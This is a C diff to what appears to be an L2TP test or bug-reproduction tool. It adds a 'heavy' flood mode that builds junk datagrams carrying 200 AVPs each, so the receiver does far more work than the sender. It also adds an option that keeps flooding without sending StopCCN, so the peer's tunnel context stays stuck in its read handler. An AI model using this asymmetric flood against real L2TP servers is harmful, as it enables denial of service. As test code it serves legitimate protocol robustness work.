@@ -6,6 +6,8 @@ int fin_flood_on = FIN_FLOOD_OFF;
 int fin_flood_stopccn_ms;
 int fin_flood_start_ms;
 int fin_flood_len_ms;
+int fin_flood_no_stopccn;
+int flood_heavy;
 
 /* "A:S:W": ms after the anchor to send StopCCN, start the flood, and flood length */
 int parse_fin_flood(const char *spec)
@@ -45,6 +47,32 @@ static int send_stopccn_now(int fd, const struct sockaddr_in *their_addr,
 	return 0;
 }
 
+/* wire bytes of one junk datagram carrying many valid AVPs, each of which the
+ * receiver allocates and frees before it can drop the datagram for its
+ * unknown tid: it costs the receiver far more than it costs this sender, so
+ * a flooded context never catches up and stays inside its read handler */
+#define HEAVY_AVPS 200
+#define HEAVY_AVP_LEN 7
+static uint8_t heavy_buf[sizeof(struct l2tp_hdr_t) + HEAVY_AVPS * HEAVY_AVP_LEN];
+
+static size_t build_heavy_junk(const struct l2tp_hdr_t *wire)
+{
+	/* flags (length 7, no M/H), vendor 0, type 8 (Vendor-Name), 1 value byte */
+	static const uint8_t avp[HEAVY_AVP_LEN] = { 0x00, 0x07, 0x00, 0x00,
+						    0x00, 0x08, 'x' };
+	struct l2tp_hdr_t hdr = *wire;
+	size_t len = sizeof(heavy_buf);
+	int i;
+
+	hdr.length = htons(len);
+	memcpy(heavy_buf, &hdr, sizeof(hdr));
+	for (i = 0; i < HEAVY_AVPS; i++)
+		memcpy(heavy_buf + sizeof(hdr) + i * HEAVY_AVP_LEN, avp,
+		       HEAVY_AVP_LEN);
+
+	return len;
+}
+
 static int init_junk(struct mmsghdr *msgs, struct iovec *iov,
 		     struct l2tp_hdr_t *wire,
 		     const struct sockaddr_in *their_addr)
@@ -62,8 +90,13 @@ static int init_junk(struct mmsghdr *msgs, struct iovec *iov,
 	wire->flags = htons(junk->hdr.flags);
 	l2tp_packet_free(junk);
 
-	iov->iov_base = wire;
-	iov->iov_len = sizeof(*wire);
+	if (flood_heavy) {
+		iov->iov_len = build_heavy_junk(wire);
+		iov->iov_base = heavy_buf;
+	} else {
+		iov->iov_base = wire;
+		iov->iov_len = sizeof(*wire);
+	}
 	memset(msgs, 0, FLOOD_BATCH * sizeof(*msgs));
 	for (i = 0; i < FLOOD_BATCH; i++) {
 		msgs[i].msg_hdr.msg_name = (void *)their_addr;
@@ -97,12 +130,18 @@ int run_fin_flood(int fd, const struct sockaddr_in *their_addr,
 		double now = now_monotonic();
 
 		if (!stopped && now >= stop_at) {
-			if (send_stopccn_now(fd, their_addr, their_tid, our_tid,
-					     ns, nr))
+			/* flood only: the tunnel's context is kept busy
+			 * without the peer closing the tunnel */
+			if (!fin_flood_no_stopccn &&
+			    send_stopccn_now(fd, their_addr, their_tid,
+					     our_tid, ns, nr))
 				return 1;
 			stopped = 1;
-			printf("event=fin_flood_stopccn t=%.6f\n", now_monotonic());
-			fflush(stdout);
+			if (!fin_flood_no_stopccn) {
+				printf("event=fin_flood_stopccn t=%.6f\n",
+				       now_monotonic());
+				fflush(stdout);
+			}
 		}
 		if (stopped && now >= flood_until)
 			break;
